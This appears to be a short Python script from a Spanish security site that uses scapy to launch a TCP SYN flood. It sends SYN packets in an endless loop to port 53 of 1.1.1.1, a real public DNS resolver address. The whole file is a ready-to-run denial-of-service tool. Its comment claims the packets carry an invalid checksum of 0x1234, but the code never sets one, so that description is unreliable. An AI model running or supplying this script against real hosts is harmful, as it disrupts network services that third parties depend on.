#! /usr/bin/env python
# Name : Antonio Taboada
# Website : www.hackingyseguridad.com
# Description : Simple ataque de inundacion de paquetes TCP SYN con checksun invalido 0x1234
import sys
from scapy.all import *
ip=IP(dst="1.1.1.1",frag=0,ttl=64)
SYN=TCP(sport=RandShort(),dport=53,flags="S",window=29200)
while True:
    send(ip/SYN)
